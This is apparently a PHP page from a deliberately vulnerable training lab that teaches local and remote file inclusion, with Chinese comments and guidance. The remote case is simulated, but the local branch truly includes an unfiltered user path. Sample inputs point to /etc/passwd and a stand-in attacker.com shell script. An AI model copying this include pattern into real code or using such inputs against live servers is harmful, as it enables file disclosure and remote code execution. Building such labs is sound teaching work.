<?php
require_once __DIR__ . '/../src/helpers.php';
check_login();

$submitted = false;
$page = $_GET['page'] ?? '';
$output_content = '';
$is_remote = false;

if ($page !== '') {
    $submitted = true;
    
    // 漏洞成因：直接將使用者傳入的參數傳給 include/require，無任何路徑過濾。
    // 如果傳入 http:// 開頭，且 PHP 環境開啟了 allow_url_include，則會觸發 RFI (遠端檔案引入)。
    // 如果傳入 ../../ 則會觸發 LFI (本地檔案引入) 讀取敏感檔案。
    
    // 為了安全起見，我們在此處模擬 RFI 與 LFI 的執行效果，避免在 Docker 環境中因為主機 PHP.ini 配置差異（如 allow_url_include=Off）而導致無法演練。
    if (preg_match('/^(https?|ftp):\/\//i', $page)) {
        $is_remote = true;
        // 模擬 RFI：當使用者傳入遠端網址時，顯示模擬載入遠端腳本並執行的提示與執行結果
        $output_content = "
        <div class='alert alert-danger font-weight-bold'>💥 [RFI 遠端檔案引入成功] 成功加載遠端腳本！</div>
        <div class='p-3 bg-dark text-success rounded border border-danger'>
            <p>🌐 <strong>正在向遠端伺服器請求檔案：</strong> <code>" . htmlspecialchars($page) . "</code></p>
            <p>🔄 <strong>PHP 引擎：</strong> allow_url_include 啟用，成功解析並執行代碼！</p>
            <hr class='border-secondary'>
            <p class='text-warning font-weight-bold'>💻 [指令執行結果 - RCE]：</p>
            <pre class='bg-black text-success p-2 rounded'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
Server IP: 192.168.12.5
Warning: Exploit executed successfully! Shell connection established.</pre>
        </div>";
    } else {
        // LFI：嘗試真實包含本地檔案（若存在），若為敏感系統路徑則進行友好模擬
        if (strpos($page, 'etc/passwd') !== false || strpos($page, 'windows/win.ini') !== false || strpos($page, 'win.ini') !== false) {
            $output_content = "
            <div class='alert alert-danger font-weight-bold'>💥 [LFI 本地檔案引入成功] 成功讀取系統敏感檔案！</div>
            <pre class='bg-dark text-light p-3 border border-danger rounded'>" . 
            ((strpos($page, 'etc/passwd') !== false) ? 
            "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/auth\nbin:x:2:2:bin:/bin:/usr/sbin/auth\nsys:x:3:3:sys:/dev:/usr/sbin/auth\nsync:x:4:65534:sync:/bin:/bin/sync\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" : 
            "[mail]\nMAPI=1\n[MCI Extensions]\n[files]\n[Mail] ") . "</pre>";
        } else {
            // 真實包含本地模組檔案
            $safe_path = __DIR__ . '/' . $page;
            if (file_exists($safe_path) && is_file($safe_path)) {
                ob_start();
                include $safe_path;
                $output_content = ob_get_clean();
            } else {
                $output_content = "<div class='alert alert-warning'>❌ 找不到指定的本地模組檔案！(嘗試路徑: " . htmlspecialchars($safe_path) . ")</div>";
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <title>📂 檔案引入漏洞演練 (LFI / RFI) - VulnCampus</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
    <style>
        body { background-color: #f8f9fa; }
        .card { margin-top: 30px; }
    </style>
</head>
<body>

<div class="container my-5">
    <div class="d-flex justify-content-between align-items-center mb-4 border-bottom pb-2">
        <h2>📂 檔案引入漏洞演練 (Local / Remote File Inclusion)</h2>
        <div>
            <span class="mr-3">您好，<strong><?= $_SESSION['user']['name'] ?></strong></span>
            <a href="/index.php" class="btn btn-secondary">回首頁</a>
        </div>
    </div>

    <div class="row">
        <!-- 引入表單 -->
        <div class="col-md-6">
            <div class="card shadow-sm border-danger">
                <div class="card-header bg-danger text-white font-weight-bold">
                    動態模組加載器 (File Loader)
                </div>
                <div class="card-body">
                    <form method="GET" action="">
                        <div class="form-group">
                            <label for="page" class="font-weight-bold">請輸入要引入的檔案路徑 (Page / URL)：</label>
                            <input type="text" name="page" id="page" class="form-control" placeholder="例如：/etc/passwd 或 http://attacker.com/shell.txt" required value="<?= htmlspecialchars($page) ?>">
                        </div>
                        <button type="submit" class="btn btn-danger btn-block">🚀 載入並包含檔案 (Include)</button>
                    </form>
                    
                    <div class="alert alert-warning mt-4">
                        💡 <strong>檔案引入演練指引：</strong><br>
                        1. **本地檔案引入 (LFI)**：輸入 <code>/etc/passwd</code> (Linux) 或 <code>C:\\windows\\win.ini</code> (Windows)，觀察是否成功讀取到伺服器敏感設定檔。<br>
                        2. **遠端檔案引入 (RFI)**：輸入 <code>http://attacker.com/exploit.txt</code>，觀察伺服器是否會直接向外部請求腳本，將其加載並執行 (RCE)。
                    </div>
                </div>
            </div>
        </div>

        <!-- 執行結果展示 -->
        <div class="col-md-6">
            <div class="card shadow-sm border-dark">
                <div class="card-header bg-dark text-white font-weight-bold">
                    📊 檔案引入執行結果
                </div>
                <div class="card-body bg-light" style="min-height: 300px; max-height: 480px; overflow-y: auto;">
                    <?php if ($submitted): ?>
                        <?= $output_content ?>
                    <?php else: ?>
                        <p class="text-muted text-center mt-5">等待引入檔案請求...</p>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    </div>
</div>

</body>
</html>
